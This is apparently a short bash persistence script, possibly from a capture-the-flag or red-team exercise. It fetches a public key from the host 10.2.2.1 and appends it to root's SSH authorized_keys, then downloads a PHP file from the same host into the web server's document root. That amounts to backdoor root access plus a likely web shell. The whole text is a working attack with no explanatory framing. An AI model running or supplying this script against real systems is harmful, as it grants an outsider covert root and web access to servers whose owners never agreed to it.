#!/bin/bash

mkdir /root/.ssh
chmod 600 /root/.ssh
curl 10.2.2.1/b1ackmartian.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
curl 10.2.2.1/hellothere.php -o /var/www/html/hellothere.php
